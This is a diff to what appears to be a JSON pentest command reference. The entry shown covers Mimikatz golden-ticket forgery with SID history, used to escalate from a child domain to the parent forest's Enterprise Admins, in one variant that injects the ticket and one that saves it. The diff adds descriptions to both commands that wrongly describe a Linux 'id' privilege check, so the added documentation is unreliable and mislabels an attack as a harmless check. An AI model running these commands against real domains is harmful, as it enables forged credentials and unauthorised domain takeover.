@@ -212,11 +212,13 @@
   "variations": [
     {
       "label": "Inject directly (ptt)",
-      "command": "kerberos::golden /user:<user> /domain:<child_domain> /sid:<child_sid> /krbtgt:<child_krbtgt_hash> /sids:<parent_ea_sid> /ptt"
+      "command": "kerberos::golden /user:<user> /domain:<child_domain> /sid:<child_sid> /krbtgt:<child_krbtgt_hash> /sids:<parent_ea_sid> /ptt",
+      "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
     },
     {
       "label": "Save to file instead",
-      "command": "kerberos::golden /user:<user> /domain:<child_domain> /sid:<child_sid> /krbtgt:<child_krbtgt_hash> /sids:<parent_ea_sid> /ticket:golden.kirbi"
+      "command": "kerberos::golden /user:<user> /domain:<child_domain> /sid:<child_sid> /krbtgt:<child_krbtgt_hash> /sids:<parent_ea_sid> /ticket:golden.kirbi",
+      "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
     }
   ],
   "steps": [
